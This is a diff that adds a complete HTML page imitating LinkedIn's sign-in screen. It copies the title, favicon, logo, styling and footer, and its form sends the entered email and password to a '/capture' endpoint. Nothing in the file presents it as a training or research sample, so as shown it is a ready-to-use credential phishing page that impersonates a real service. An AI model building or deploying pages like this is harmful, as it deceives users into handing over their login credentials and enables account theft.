@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="icon" href="https://static.licdn.com/aero-v1/sc/h/al2o9zrvru7aqj8e1x2rzsrca">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+        
+        body { background: #f3f2ef; min-height: 100vh; }
+        
+        .header {
+            padding: 16px 32px;
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo { display: flex; align-items: center; }
+        .logo svg { height: 34px; color: #0a66c2; }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 100px);
+            padding: 40px 20px;
+        }
+        
+        .card {
+            background: #fff;
+            padding: 24px 32px;
+            width: 100%;
+            max-width: 352px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+        
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #000;
+            line-height: 1.25;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        
+        .input-group { margin-bottom: 16px; }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #000;
+            margin-bottom: 6px;
+            line-height: 1.3;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #000;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        input:focus { outline: none; box-shadow: 0 0 0 1px #000; }
+        
+        .forgot {
+            display: inline-block;
+            color: #0a66c2;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: 8px;
+        }
+        .forgot:hover { text-decoration: underline; color: #004182; }
+        
+        .sign-in-btn {
+            width: 100%;
+            background: #0a66c2;
+            color: #fff;
+            border: none;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background 0.2s;
+        }
+        .sign-in-btn:hover { background: #004182; }
+        
+        .divider {
+            margin: 24px 0;
+            text-align: center;
+            position: relative;
+        }
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        .divider span {
+            background: #fff;
+            padding: 0 16px;
+            position: relative;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            background: #fff;
+            color: #0a66c2;
+            border: 1px solid #0a66c2;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-secondary:hover { background: rgba(112,181,249,0.15); }
+        
+        .join-now {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 16px;
+            color: #000;
+        }
+        .join-now a {
+            color: #0a66c2;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .join-now a:hover { text-decoration: underline; }
+        
+        footer {
+            background: #fff;
+            padding: 24px 32px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            font-size: 12px;
+        }
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+        .footer-links a:hover { color: #0a66c2; text-decoration: underline; }
+        .copyright { margin-top: 12px; font-size: 12px; color: #666; }
+        
+        .legal-notice {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+        .legal-notice a { color: #0a66c2; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <svg viewBox="0 0 84 21" width="84" height="21" fill="#0a66c2">
+                <path d="M0 7.77h4.66v13h-4.66zM2.33 0c1.56 0 2.83 1.28 2.83 2.83 0 1.56-1.27 2.83-2.83 2.83-1.56 0-2.83-1.27-2.83-2.83C.5 1.27 1.77 0 2.33 0M8.27 7.77h4.46v1.78h.06c.62-1.18 2.14-2.36 4.4-2.36 4.7 0 5.57 3.1 5.57 7.13v8.45h-4.66v-7.5c0-1.74-.03-3.97-2.42-3.97-2.42 0-2.8 1.88-2.8 3.84v7.63h-4.66V7.77zm21.22 0h4.67v13h-4.67zm2.34-6c1.56 0 2.83 1.27 2.83 2.83 0 1.56-1.27 2.83-2.83 2.83-1.56 0-2.83-1.27-2.83-2.83 0-1.56 1.27-2.83 2.83-2.83m6.55 6h4.46v1.78h.06c.62-1.18 2.14-2.36 4.4-2.36 4.7 0 5.57 3.1 5.57 7.13v8.45h-4.66v-7.5c0-1.74-.03-3.97-2.42-3.97-2.42 0-2.8 1.88-2.8 3.84v7.63h-4.66V7.77z"/>
+            </svg>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <h1>Sign in</h1>
+            <p class="subtitle">Stay updated on your professional world</p>
+            
+            <form action="/capture" method="POST">
+                <div class="input-group">
+                    <label>Email or phone</label>
+                    <input type="text" name="email" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" required>
+                </div>
+                
+                <a href="#" class="forgot">Forgot password?</a>
+                
+                <button type="submit" class="sign-in-btn">Sign in</button>
+            </form>
+            
+            <div class="divider"><span>or</span></div>
+            
+            <button class="btn-secondary">Sign in with code</button>
+            
+            <p class="join-now">New to LinkedIn? <a href="#">Join now</a></p>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">User Agreement</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Community Guidelines</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Copyright Policy</a>
+            <a href="#">Send Feedback</a>
+            <a href="#">Language</a>
+        </div>
+        <div class="copyright">LinkedIn Corporation © 2026</div>
+    </footer>
+</body>
+</html>
